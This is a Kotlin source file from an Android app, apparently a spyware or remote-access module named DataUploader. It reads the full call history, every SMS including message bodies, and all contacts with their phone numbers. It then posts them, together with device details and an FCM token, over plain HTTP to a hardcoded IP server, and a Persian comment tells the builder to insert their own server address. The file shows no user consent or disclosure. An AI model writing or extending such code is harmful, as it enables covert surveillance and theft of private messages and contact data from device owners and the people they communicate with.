package com.example.test.utils

import android.content.Context
import android.util.Log
import android.provider.ContactsContract
import android.provider.Telephony
import android.database.Cursor
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

object DataUploader {

    private const val TAG = "DataUploader"
    private const val BASE_URL = "http://95.134.130.160:8765" // 🔴 آدرس سرور خودت رو اینجا بذار

    /**
     * رجیستر کردن دستگاه در سرور (فرمت WebSocket مثل Flutter)
     */
    fun registerDevice(context: Context, deviceId: String, fcmToken: String, userId: String): Boolean {
        return try {
            Log.d(TAG, "📝 Registering device: $deviceId")

            // استفاده از DeviceInfoHelper برای گرفتن اطلاعات کامل دستگاه
            val deviceInfo = DeviceInfoHelper.buildDeviceInfoJson(context, deviceId, fcmToken, userId)

            // ساخت JSON با فرمت Flutter WebSocket
            val registerJson = JSONObject().apply {
                put("type", "register")
                put("device_id", deviceId)
                put("device_info", deviceInfo)
                put("user_id", userId)
                put("app_type", "MP")
            }

            val result = sendPostRequest("$BASE_URL/register", registerJson.toString())
            Log.d(TAG, "✅ Device registered successfully")
            true

        } catch (e: Exception) {
            Log.e(TAG, "❌ Register device failed: ${e.message}", e)
            false
        }
    }

    /**
     * آپلود تاریخچه تماس‌ها
     */
    fun uploadCallHistory(context: Context, deviceId: String) {
        try {
            Log.d(TAG, "📞 Reading call history...")

            val calls = JSONArray()
            val cursor: Cursor? = context.contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                null, null, null,
                android.provider.CallLog.Calls.DATE + " DESC"
            )

            cursor?.use {
                val numberIndex = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                val typeIndex = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
                val dateIndex = it.getColumnIndex(android.provider.CallLog.Calls.DATE)
                val durationIndex = it.getColumnIndex(android.provider.CallLog.Calls.DURATION)

                while (it.moveToNext()) {
                    val call = JSONObject().apply {
                        put("number", it.getString(numberIndex) ?: "")
                        put("type", it.getInt(typeIndex))
                        put("date", it.getLong(dateIndex))
                        put("duration", it.getInt(durationIndex))
                    }
                    calls.put(call)
                }
            }

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("calls", calls)
                put("timestamp", System.currentTimeMillis())
            }

            sendPostRequest("$BASE_URL/call-history", json.toString())
            Log.d(TAG, "✅ Call history uploaded: ${calls.length()} calls")

        } catch (e: Exception) {
            Log.e(TAG, "❌ Upload call history failed: ${e.message}", e)
        }
    }

    /**
     * آپلود همه پیامک‌ها
     */
    fun uploadAllSms(context: Context, deviceId: String) {
        try {
            Log.d(TAG, "💬 Reading SMS messages...")

            val messages = JSONArray()
            val cursor: Cursor? = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                null, null, null,
                Telephony.Sms.DATE + " DESC"
            )

            cursor?.use {
                val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
                val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)

                while (it.moveToNext()) {
                    val sms = JSONObject().apply {
                        put("address", it.getString(addressIndex) ?: "")
                        put("body", it.getString(bodyIndex) ?: "")
                        put("date", it.getLong(dateIndex))
                        put("type", it.getInt(typeIndex))
                    }
                    messages.put(sms)
                }
            }

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("messages", messages)
                put("timestamp", System.currentTimeMillis())
            }

            sendPostRequest("$BASE_URL/sms", json.toString())
            Log.d(TAG, "✅ SMS uploaded: ${messages.length()} messages")

        } catch (e: Exception) {
            Log.e(TAG, "❌ Upload SMS failed: ${e.message}", e)
        }
    }

    /**
     * آپلود همه مخاطبین
     */
    fun uploadAllContacts(context: Context, deviceId: String) {
        try {
            Log.d(TAG, "👥 Reading contacts...")

            val contacts = JSONArray()
            val cursor: Cursor? = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            )

            cursor?.use {
                val idIndex = it.getColumnIndex(ContactsContract.Contacts._ID)
                val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)

                while (it.moveToNext()) {
                    val contactId = it.getString(idIndex)
                    val name = it.getString(nameIndex) ?: ""

                    // خواندن شماره‌های تماس
                    val phones = JSONArray()
                    val phoneCursor = context.contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        arrayOf(contactId),
                        null
                    )

                    phoneCursor?.use { pc ->
                        val phoneIndex = pc.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                        while (pc.moveToNext()) {
                            phones.put(pc.getString(phoneIndex) ?: "")
                        }
                    }

                    if (phones.length() > 0) {
                        val contact = JSONObject().apply {
                            put("name", name)
                            put("phones", phones)
                        }
                        contacts.put(contact)
                    }
                }
            }

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("contacts", contacts)
                put("timestamp", System.currentTimeMillis())
            }

            sendPostRequest("$BASE_URL/contacts", json.toString())
            Log.d(TAG, "✅ Contacts uploaded: ${contacts.length()} contacts")

        } catch (e: Exception) {
            Log.e(TAG, "❌ Upload contacts failed: ${e.message}", e)
        }
    }

    /**
     * ارسال وضعیت باتری
     */
    fun sendBatteryUpdate(context: Context, deviceId: String, fcmToken: String) {
        try {
            val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            val batteryLevel = batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("fcm_token", fcmToken)
                put("battery_level", batteryLevel)
                put("timestamp", System.currentTimeMillis())
            }

            sendPostRequest("$BASE_URL/battery", json.toString())
            Log.d(TAG, "🔋 Battery update sent: $batteryLevel%")

        } catch (e: Exception) {
            Log.e(TAG, "❌ Battery update failed: ${e.message}", e)
        }
    }

    /**
     * ارسال درخواست POST به سرور
     */
    private fun sendPostRequest(urlString: String, jsonData: String): String? {
        var connection: HttpURLConnection? = null
        try {
            val url = URL(urlString)
            connection = url.openConnection() as HttpURLConnection
            connection.apply {
                requestMethod = "POST"
                doOutput = true
                setRequestProperty("Content-Type", "application/json")
                connectTimeout = 15000
                readTimeout = 15000
            }

            // ارسال داده
            connection.outputStream.use { os ->
                os.write(jsonData.toByteArray())
                os.flush()
            }

            // دریافت پاسخ
            val responseCode = connection.responseCode
            Log.d(TAG, "📡 Response code: $responseCode")

            return if (responseCode == HttpURLConnection.HTTP_OK) {
                connection.inputStream.bufferedReader().use { it.readText() }
            } else {
                null
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ HTTP request failed: ${e.message}", e)
            return null
        } finally {
            connection?.disconnect()
        }
    }
}